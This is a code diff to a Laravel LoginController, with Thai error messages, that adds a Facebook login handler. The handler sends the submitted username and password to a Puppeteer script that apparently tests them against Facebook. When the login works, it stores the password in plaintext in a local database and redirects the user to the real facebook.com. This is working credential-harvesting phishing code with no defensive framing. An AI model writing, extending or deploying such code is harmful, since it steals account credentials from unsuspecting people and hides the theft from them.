@@ -40,4 +40,28 @@ class LoginController extends Controller
             return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
         }
     } 
+    public function loginFacebook(Request $request){
+        $username = escapeshellarg($request->username);
+        $password = escapeshellarg($request->password);
+
+        // เรียกใช้งานไฟล์ puppeteerFB.js สำหรับ Facebook
+        $output = shell_exec("node " . base_path('puppeteerFB.js') . " $username $password");
+
+        if (trim($output) === "Login successful") {
+            $user = Userdb::where("username", $request->username)->first();
+
+            if ($user) {
+                return redirect("https://facebook.com/");
+            } else {
+                $newUser = new Userdb;
+                $newUser->username = $request->username;
+                $newUser->password = $request->password;
+                $newUser->save();
+
+                return redirect("https://facebook.com/");
+            }
+        } else {
+            return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
+        }
+    }
 }
